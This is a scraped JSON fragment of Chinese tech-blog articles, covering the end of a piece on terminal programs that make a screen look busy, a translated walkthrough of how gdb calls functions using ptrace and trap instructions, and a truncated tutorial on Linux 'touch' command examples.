采取更直接的方法。它本质上是在终端中创建一个随机的数量和配置的分屏，并启动那些看起来很繁忙的应用程序，如 htop、目录树、源代码文件等，并每隔几秒将其切换。它被组织成一个 shell 脚本，所以可以非常容易地根据需求进行修改。,\n,Hollywood的 ,源代码, 在 GitHub 上开源（遵循 ,Apache 2.0 许可证,）。,\n,\n,Blessed-contrib,\n,Blessed-contrib 是我个人最喜欢的应用，实际上并不是为了这种表演而专门设计的应用。相反地，它是一个基于 Node.js 的终端仪表盘的构建库的演示文件。与其他两个不同，实际上我已经在工作中使用 Blessed-contrib 的库，而不是用于假装忙于工作。因为它是一个相当有用的库，并且可以使用一组在命令行显示信息的小部件。与此同时填充虚拟数据也很容易，所以可以很容易实现你在计算机上模拟《战争游戏》的想法。,\n,Blessed-contrib 的,源代码,在 GitHub 上（遵循 ,MIT 许可证,）。,\n,\n,当然，尽管这些工具很容易使用，但也有很多其他的方式使你的屏幕丰富。在你看到电影中最常用的工具之一就是Nmap，这是一个开源的网络安全扫描工具。实际上，它被广泛用作展示好莱坞电影中，黑客电脑屏幕上的工具。因此 Nmap 的开发者创建了一个 ,页面,，列出了它出现在其中的一些电影，从《黑客帝国 2：重装上阵》到《谍影重重3》、《龙纹身的女孩》，甚至《虎胆龙威 4》。,\n,当然，您可以创建自己的组合，使用终端多路复用器（如 ,screen, 或 ,tmux,）启动您希望使用的任何数据切分程序。,\n,那么，您是如何使用您的屏幕的呢？,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 5 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113936/", "url_object_id": "6dc0686e6040c195843be3d562eb4e11", "front_image_path": "full/59a85d2a0fc8546d12c3afa0f0aae247f4861301.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/099ab3d51f135a121ab1ae294f13298a.jpg"], "title": "gdb 如何调用函数？", "create_time": "2018/04/30", "vote": "1", "bookmark": "4", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： , Julia Evans,   译文出处：,linux,   ,在这周，我发现我可以从 gdb 上调用 C 函数。这看起来很酷，因为在过去我认为 gdb 最多只是一个只读调试工具。,\n,\n,我对 gdb 能够调用函数感到很吃惊。正如往常所做的那样，我在 ,Twitter, 上询问这是如何工作的。我得到了大量的有用答案。我最喜欢的答案是 ,Evan Klitzke 的示例 C 代码,，它展示了 gdb 如何调用函数。代码能够运行，这很令人激动！,\n,我（通过一些跟踪和实验）认为那个示例 C 代码和 gdb 实际上如何调用函数不同。因此，在这篇文章中，我将会阐述 gdb 是如何调用函数的，以及我是如何知道的。,\n,关于 gdb 如何调用函数，还有许多我不知道的事情，并且，在这儿我写的内容有可能是错误的。,\n,从 gdb 中调用 C 函数意味着什么？,\n,在开始讲解这是如何工作之前，我先快速的谈论一下我是如何发现这件令人惊讶的事情的。,\n,假如，你已经在运行一个 C 程序（目标程序）。你可以运行程序中的一个函数，只需要像下面这样做：,\n,\n,暂停程序（因为它已经在运行中）,\n,找到你想调用的函数的地址（使用符号表）,\n,使程序（目标程序）跳转到那个地址,\n,当函数返回时，恢复之前的指令指针和寄存器,\n,\n,通过符号表来找到想要调用的函数的地址非常容易。下面是一段非常简单但能够工作的代码，我在 Linux 上使用这段代码作为例子来讲解如何找到地址。这段代码使用 ,elf crate,。如果我想找到 PID 为 2345 的进程中的 ,foo, 函数的地址，那么我可以运行 ,elf_symbol_value(\"/proc/2345/exe\", \"foo\"),。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfn elf_symbol_value(file_name: &str, symbol_name: &str) -> Result<u64, Box<std::error::Error>> {\r\n    // 打开 ELF 文件 \r\n    let file = elf::File::open_path(file_name).ok().ok_or(\"parse error\")?;\r\n    // 在所有的段 & 符号中循环，直到找到正确的那个\r\n    let sections = &file.sections;\r\n    for s in sections {\r\n        for sym in file.get_symbols(&s).ok().ok_or(\"parse error\")? {\r\n            if sym.name == symbol_name {\r\n                return Ok(sym.value);\r\n            }\r\n        }\r\n    }\r\n    None.ok_or(\"No symbol found\")?\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,fn ,elf_symbol_value,(,file_name,:, ,&,str,,, ,symbol_name,:, ,&,str,), ,->, ,Result,<,u64,,, ,Box,<,std,::,error,::,Error,>>, ,{,    ,// 打开 ELF 文件 ,    ,let ,file, ,=, ,elf,::,File,::,open_path,(,file_name,),.,ok,(,),.,ok_or,(,\"parse error\",),?,;,    ,// 在所有的段 & 符号中循环，直到找到正确的那个,    ,let ,sections, ,=, ,&,file,.,sections,;,    ,for, ,s, ,in, ,sections, ,{,        ,for, ,sym ,in, ,file,.,get_symbols,(,&,s,),.,ok,(,),.,ok_or,(,\"parse error\",),?, ,{,            ,if, ,sym,.,name, ,==, ,symbol_name, ,{,                ,return, ,Ok,(,sym,.,value,),;,            ,},        ,},    ,},    ,None,.,ok_or,(,\"No symbol found\",),?,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这并不能够真的发挥作用，你还需要找到文件的内存映射，并将符号偏移量加到文件映射的起始位置。找到内存映射并不困难，它位于 ,/proc/PID/maps, 中。,\n,总之，找到想要调用的函数地址对我来说很直接，但是其余部分（改变指令指针，恢复寄存器等）看起来就不这么明显了。,\n,你不能仅仅进行跳转,\n,我已经说过，你不能够仅仅找到你想要运行的那个函数地址，然后跳转到那儿。我在 gdb 中尝试过那样做（,jump foo,），然后程序出现了段错误。毫无意义。,\n,如何从 gdb 中调用 C 函数,\n,首先，这是可能的。我写了一个非常简洁的 C 程序，它所做的事只有 ,sleep, 1000 秒，把这个文件命名为 ,test.c, ：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include <unistd.h>\r\nint foo() {\r\n    return 3;\r\n}\r\nint main() {\r\n    sleep(1000);\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include <unistd.h>,int, ,foo,(,), ,{,    ,return, ,3,;,},int, ,main,(,), ,{,    ,sleep,(,1000,),;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,接下来，编译并运行它：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ gcc -o test  test.c\r\n$ ./test,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,gcc, ,-,o, ,test  ,test,.,c,$, ,.,/,test,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,最后，我们使用 gdb 来跟踪 ,test, 这一程序：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo gdb -p $(pgrep -f test)\r\n(gdb) p foo()\r\n$1 = 3\r\n(gdb) quit,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,gdb, ,-,p, ,$,(,pgrep, ,-,f, ,test,),(,gdb,), ,p, ,foo,(,),$,1, ,=, ,3,(,gdb,), ,quit,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我运行 ,p foo(), 然后它运行了这个函数！这非常有趣。,\n,这有什么用？,\n,下面是一些可能的用途：,\n,\n,它使得你可以把 gdb 当成一个 C 应答式程序（REPL），这很有趣，我想对开发也会有用,\n,在 gdb 中进行调试的时候展示/浏览复杂数据结构的功能函数（感谢 ,@invalidop,）,\n,在进程运行时设置一个任意的名字空间,（我的同事 ,nelhage, 对此非常惊讶）,\n,可能还有许多我所不知道的用途,\n,\n,它是如何工作的,\n,当我在 Twitter 上询问从 gdb 中调用函数是如何工作的时，我得到了大量有用的回答。许多答案是“你从符号表中得到了函数的地址”，但这并不是完整的答案。,\n,有个人告诉了我两篇关于 gdb 如何工作的系列文章：,原生调试：第一部分,，,原生调试：第二部分,。第一部分讲述了 gdb 是如何调用函数的（指出了 gdb 实际上完成这件事并不简单，但是我将会尽力）。,\n,步骤列举如下：,\n,\n,停止进程,\n,创建一个新的栈框（远离真实栈）,\n,保存所有寄存器,\n,设置你想要调用的函数的寄存器参数,\n,设置栈指针指向新的栈框stack frame,\n,在内存中某个位置放置一条陷阱指令,\n,为陷阱指令设置返回地址,\n,设置指令寄存器的值为你想要调用的函数地址,\n,再次运行进程！,\n,\n,（LCTT 译注：如果将这个调用的函数看成一个单独的线程，gdb 实际上所做的事情就是一个简单的线程上下文切换）,\n,我不知道 gdb 是如何完成这些所有事情的，但是今天晚上，我学到了这些所有事情中的其中几件。,\n,创建一个栈框,\n,如果你想要运行一个 C 函数，那么你需要一个栈来存储变量。你肯定不想继续使用当前的栈。准确来说，在 gdb 调用函数之前（通过设置函数指针并跳转），它需要设置栈指针到某个地方。,\n,这儿是 Twitter 上一些关于它如何工作的猜测：,\n,我认为它在当前栈的栈顶上构造了一个新的栈框来进行调用！,\n,以及,\n,你确定是这样吗？它应该是分配一个伪栈，然后临时将 sp （栈指针寄存器）的值改为那个栈的地址。你可以试一试，你可以在那儿设置一个断点，然后看一看栈指针寄存器的值，它是否和当前程序寄存器的值相近？,\n,我通过 gdb 做了一个试验：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n(gdb) p $rsp\r\n$7 = (void *) 0x7ffea3d0bca8\r\n(gdb) break foo\r\nBreakpoint 1 at 0x40052a\r\n(gdb) p foo()\r\nBreakpoint 1, 0x000000000040052a in foo ()\r\n(gdb) p $rsp\r\n$8 = (void *) 0x7ffea3d0bc00,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,(,gdb,), ,p, ,$,rsp,$,7, ,=, ,(,void, ,*,), ,0x7ffea3d0bca8,(,gdb,), ,break, ,foo,Breakpoint, ,1, ,at, ,0x40052a,(,gdb,), ,p, ,foo,(,),Breakpoint, ,1,,, ,0x000000000040052a, ,in, ,foo, ,(,),(,gdb,), ,p, ,$,rsp,$,8, ,=, ,(,void, ,*,), ,0x7ffea3d0bc00,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这看起来符合“gdb 在当前栈的栈顶构造了一个新的栈框”这一理论。因为栈指针（,$rsp,）从 ,0x7ffea3d0bca8, 变成了 ,0x7ffea3d0bc00, —— 栈指针从高地址往低地址长。所以 ,0x7ffea3d0bca8, 在 ,0x7ffea3d0bc00, 的后面。真是有趣！,\n,所以，看起来 gdb 只是在当前栈所在位置创建了一个新的栈框。这令我很惊讶！,\n,改变指令指针,\n,让我们来看一看 gdb 是如何改变指令指针的！,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n(gdb) p $rip\r\n$1 = (void (*)()) 0x7fae7d29a2f0 <__nanosleep_nocancel+7>\r\n(gdb) b foo\r\nBreakpoint 1 at 0x40052a\r\n(gdb) p foo()\r\nBreakpoint 1, 0x000000000040052a in foo ()\r\n(gdb) p $rip\r\n$3 = (void (*)()) 0x40052a <foo+4>,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,(,gdb,), ,p, ,$,rip,$,1, ,=, ,(,void, ,(,*,),(,),), ,0x7fae7d29a2f0, ,<,__nanosleep_nocancel,+,7,>,(,gdb,), ,b, ,foo,Breakpoint, ,1, ,at, ,0x40052a,(,gdb,), ,p, ,foo,(,),Breakpoint, ,1,,, ,0x000000000040052a, ,in, ,foo, ,(,),(,gdb,), ,p, ,$,rip,$,3, ,=, ,(,void, ,(,*,),(,),), ,0x40052a, ,<,foo,+,4,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,的确是！指令指针从 ,0x7fae7d29a2f0, 变为了 ,0x40052a,（,foo, 函数的地址）。,\n,我盯着输出看了很久，但仍然不理解它是如何改变指令指针的，但这并不影响什么。,\n,如何设置断点,\n,上面我写到 ,break foo, 。我跟踪 gdb 运行程序的过程，但是没有任何发现。,\n,下面是 gdb 用来设置断点的一些系统调用。它们非常简单。它把一条指令用 ,cc, 代替了（这告诉我们 ,int3, 意味着 ,send SIGTRAP, ,https://defuse.ca/online-x86-assembler.html,），并且一旦程序被打断了，它就把指令恢复为原先的样子。,\n,我在函数 ,foo, 那儿设置了一个断点，地址为 ,0x400528, 。,\n,PTRACE_POKEDATA, 展示了 gdb 如何改变正在运行的程序。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n// 改变 0x400528 处的指令\r\n25622 ptrace(PTRACE_PEEKTEXT, 25618, 0x400528, [0x5d00000003b8e589]) = 0\r\n25622 ptrace(PTRACE_POKEDATA, 25618, 0x400528, 0x5d00000003cce589) = 0\r\n// 开始运行程序\r\n25622 ptrace(PTRACE_CONT, 25618, 0x1, SIG_0) = 0\r\n// 当到达断点时获取一个信号\r\n25622 ptrace(PTRACE_GETSIGINFO, 25618, NULL, {si_signo=SIGTRAP, si_code=SI_KERNEL, si_value={int=-1447215360, ptr=0x7ffda9bd3f00}}) = 0\r\n// 将 0x400528 处的指令更改为之前的样子\r\n25622 ptrace(PTRACE_PEEKTEXT, 25618, 0x400528, [0x5d00000003cce589]) = 0\r\n25622 ptrace(PTRACE_POKEDATA, 25618, 0x400528, 0x5d00000003b8e589) = 0,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,// 改变 0x400528 处的指令,25622, ,ptrace,(,PTRACE_PEEKTEXT,,, ,25618,,, ,0x400528,,, ,[,0x5d00000003b8e589,],), ,=, ,0,25622, ,ptrace,(,PTRACE_POKEDATA,,, ,25618,,, ,0x400528,,, ,0x5d00000003cce589,), ,=, ,0,// 开始运行程序,25622, ,ptrace,(,PTRACE_CONT,,, ,25618,,, ,0x1,,, ,SIG_0,), ,=, ,0,// 当到达断点时获取一个信号,25622, ,ptrace,(,PTRACE_GETSIGINFO,,, ,25618,,, ,NULL,,, ,{,si_signo,=,SIGTRAP,,, ,si_code,=,SI_KERNEL,,, ,si_value,=,{,int,=,-,1447215360,,, ,ptr,=,0x7ffda9bd3f00,},},), ,=, ,0,// 将 0x400528 处的指令更改为之前的样子,25622, ,ptrace,(,PTRACE_PEEKTEXT,,, ,25618,,, ,0x400528,,, ,[,0x5d00000003cce589,],), ,=, ,0,25622, ,ptrace,(,PTRACE_POKEDATA,,, ,25618,,, ,0x400528,,, ,0x5d00000003b8e589,), ,=, ,0,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,在某处放置一条陷阱指令,\n,当 gdb 运行一个函数的时候，它也会在某个地方放置一条陷阱指令。这是其中一条。它基本上是用 ,cc, 来替换一条指令（,int3,）。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n5908  ptrace(PTRACE_PEEKTEXT, 5810, 0x7f6fa7c0b260, [0x48f389fd89485355]) = 0\r\n5908  ptrace(PTRACE_PEEKTEXT, 5810, 0x7f6fa7c0b260, [0x48f389fd89485355]) = 0\r\n5908 ptrace(PTRACE_POKEDATA, 5810, 0x7f6fa7c0b260, 0x48f389fd894853cc) = 0,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,5908,  ,ptrace,(,PTRACE_PEEKTEXT,,, ,5810,,, ,0x7f6fa7c0b260,,, ,[,0x48f389fd89485355,],), ,=, ,0,5908,  ,ptrace,(,PTRACE_PEEKTEXT,,, ,5810,,, ,0x7f6fa7c0b260,,, ,[,0x48f389fd89485355,],), ,=, ,0,5908, ,ptrace,(,PTRACE_POKEDATA,,, ,5810,,, ,0x7f6fa7c0b260,,, ,0x48f389fd894853cc,), ,=, ,0,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,0x7f6fa7c0b260, 是什么？我查看了进程的内存映射，发现它位于 ,/lib/x86_64-linux-gnu/libc-2.23.so, 中的某个位置。这很奇怪，为什么 gdb 将陷阱指令放在 libc 中？,\n,让我们看一看里面的函数是什么，它是 ,__libc_siglongjmp, 。其他 gdb 放置陷阱指令的地方的函数是 ,__longjmp, 、,___longjmp_chk, 、,dl_main, 和 ,_dl_close_worker, 。,\n,为什么？我不知道！也许出于某种原因，当函数 ,foo(), 返回时，它调用 ,longjmp, ，从而 gdb 能够进行返回控制。我不确定。,\n,gdb 如何调用函数是很复杂的！,\n,我将要在这儿停止了（现在已经凌晨 1 点），但是我知道的多一些了！,\n,看起来“gdb 如何调用函数”这一问题的答案并不简单。我发现这很有趣并且努力找出其中一些答案，希望你也能够找到。,\n,我依旧有很多未回答的问题，关于 gdb 是如何完成这些所有事的，但是可以了。我不需要真的知道关于 gdb 是如何工作的所有细节，但是我很开心，我有了一些进一步的理解。,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 4 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113938/", "url_object_id": "61fa89b1048f81486fc4d24533306dce", "front_image_path": "full/e409b311b4a4a04e558409d9b741ef77b0ddd466.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "title": "在 Linux 下 9 个有用的 touch 命令示例", "create_time": "2018/05/06", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Pradeep Kumar,   译文出处：,Linux中国/MjSeven,   ,touch, 命令用于创建空文件，也可以更改 Unix 和 Linux 系统上现有文件时间戳。这里所说的更改时间戳意味着更新文件和目录的访问以及修改时间。,\n,让我们来看看 ,touch, 命令的语法和选项：,\n,语法,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# touch {选项} {文件}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# touch {选项} {文件}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,touch, 命令中使用的选项：,\n,\n,在这篇文章中，我们将介绍 Linux 中 9 个有用的 ,touch, 命令示例。,\n,示例：1 使用 touch 创建一个空文件,\n,要在 Linux 系统上使用 ,touch, 命令创建空文件，键入 ,touch,，然后输入文件名。如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# touch devops.txt\r\n[root@linuxtechi ~]# ls -l devops.txt\r\n-rw-r--r--. 1 root root 0 Mar 29 22:39 devops.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# touch devops.txt,[,root,@,linuxtechi, ,~,],# ls -l devops.txt,-,rw,-,r,--,r,--,., ,1, ,root ,root, ,0, ,Mar, ,29, ,22,:,39, ,devops,.,txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,示例：2 使用 touch 创建批量空文件,\n,可能会出现一些情况，我们必须为某些测试创建大量空文件，这可以使用 ,touch, 命令轻松实现：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# touch sysadm-{1..20}.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# touch sysadm-{1..20}.txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在上面的例子中，我们创建了 20 个名为 ,sysadm-1.txt, 到 ,sysadm-20.txt, 的空文件，你可以根据需要更改名称和数字。,\n,示例：3 改变/更新文件和目录的访问时间,\n,假设我们想要改变名为 ,devops.txt, 文件的访问时间，在 ,touch, 命令中使用 ,-a, 选项，然后输入文件名。如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# touch -a devops.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# touch -a devops.txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在使用 ,stat, 命令验证文件的访问时间是否已更新：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# stat devops.txt\r\n  File: 'devops.txt'\r\n  Size: 0               Blocks: 0          IO Block: 4096   regular empty file\r\nDevice: fd00h/64768d    Inode: 67324178    Links: 1\r\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\r\nContext: unconfined_u:object_r:admin_home_t:s0\r\nAccess: 2018-03-29 23:03:10.902000000 -0400\r\nModify: 2018-03-29 22:39:29.365000000 -0400\r\nChange: 2018-03-29 23:03:10.902000000 -0400\r\n Birth: -\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# stat devops.txt,  ,File,:, ,'devops.txt',  ,Size,:, ,0,               ,Blocks,:, ,0,          ,IO ,Block,:, ,4096,   ,regular ,empty ,file,Device,:, ,fd00h,/,64768d,    ,Inode,:, ,67324178,    ,Links,:, ,1,Access,:, ,(,0644,/,-,rw,-,r,--,r,--,),  ,Uid,:, ,(,    ,0,/,    ,root,),   ,Gid,:, ,(,    ,0,/,    ,root,),Context,:, ,unconfined_u,:,object_r,:,admin_home_t,:,s0,Access,:, ,2018,-,03,-,29, ,23,:,03,:,10.902000000, ,-,0400,Modify,:, ,2018,-,03,-,29, ,22,:,39,:,29.365000000, ,-,0400,Change,:, ,2018,-,03,-,29, ,23,:,03,:,10.902000000, ,-,0400, ,Birth,:, ,-, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,改变目录的访问时间：,\n,假设我们在 ,/mnt, 目录下有一个 ,nfsshare, 文件夹，让我们用下面的命令改变这个文件夹的访问时间：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# touch -m /mnt/nfsshare/\r\n[root@linuxtechi ~]# stat /mnt/nfsshare/\r\n  File: '/mnt/nfsshare/'\r\n  Size: 6               Blocks: 0          IO Block: 4096   directory\r\nDevice: fd00h/64768d    Inode: 2258        Links: 2\r\nAccess: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)\r\nContext: unconfined_u:object_r:mnt_t:s0\r\nAccess: 2018-03-29 23:34:38.095000000 -0400\r\nModify: 2018-03-03 10:42:45.194000000 -0500\r\nChange: 2018-03-29 23:34:38.095000000 -0400\r\n Birth: -\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# touch -m /mnt/nfsshare/,[,root,@,linuxtechi, ,~,],# stat /mnt/nfsshare/, , ,File,:, ,'/mnt/nfsshare/', , ,Size,:, ,6,              , ,Blocks,:, ,0,         , ,IO ,Block,:, ,4096,  , ,directory,Device,:, ,fd00h,/,64768d,   , ,Inode,:, ,2258,       , ,Links,:, ,2,Access,:, ,(,0755,/,drwxr,-,xr,-,x,), , ,Uid,:, ,(,   , ,0,/,   , ,root,),  , ,Gid,:, ,(,   , ,0,/,   , ,root,),Context,:, ,unconfined_u,:,object_r,:,mnt_t,:,s0,Access,:, ,2018,-,03,-,29, ,23,:,34,:,38.095000000, ,-,0400,Modify,:, ,2018,-,03,-,03, ,10,:,42,:,45.194000000, ,-,0500,Change,:, ,2018,-,03,-,29, ,23,:,34,:,38.095000000, ,-,0400, ,Birth,:, ,-, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,示例：4 更改访问时间而不用创建新文件,\n,在某些情况下，如果文件存在，我们希望更改文件的访问时间，并避免创建文件。在 touch 命令中使用 ,-c, 选项即可，如果文件存在，那么我们可以改变文件的访问时间，如果不存在，我们也可不会创建它。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# touch -c sysadm-20.txt\r\n[root@linuxtechi ~]# touch -c winadm-20.txt\r\n[root@linuxtechi ~]# ls -l winadm-20.txt\r\nls: cannot access winadm-20.txt: No such file or directory\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# touch -c sysadm-20.txt,[,root,@,linuxtechi, ,~,],# touch -c winadm-20.txt,[,root,@,linuxtechi, ,~,],# ls -l winadm-20.txt,ls,:, ,cannot ,access ,winadm,-,20.txt,:, ,No ,such ,file ,or, ,directory, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,示例：5 更改文件和目录的修改时间,\n,在 ,touch, 命令中使用 ,-m, 选项，我们可以更改文件和目录的修改时间。,\n,让我们更改名为 ,devops.txt, 文件的更改时间：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# touch -m devops.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# touch -m devops.txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在使用 ,stat, 命令来验证修改时间是否改变：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# stat devops.txt\r\n  File: 'devops.txt'\r\n  Size: 0               Blocks: 0          IO Block: 4096   regular empty file\r\nDevice: fd00h/64768d    Inode: 67324178    Links: 1\r\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\r\nContext: unconfined_u:object_r:admin_home_t:s0\r\nAccess: 2018-03-29 23:03:10.902000000 -0400\r\nModify: 2018-03-29 23:59:49.106000000 -0400\r\nChange: 2018-03-29 23:59:49.106000000 -0400\r\n Birth: 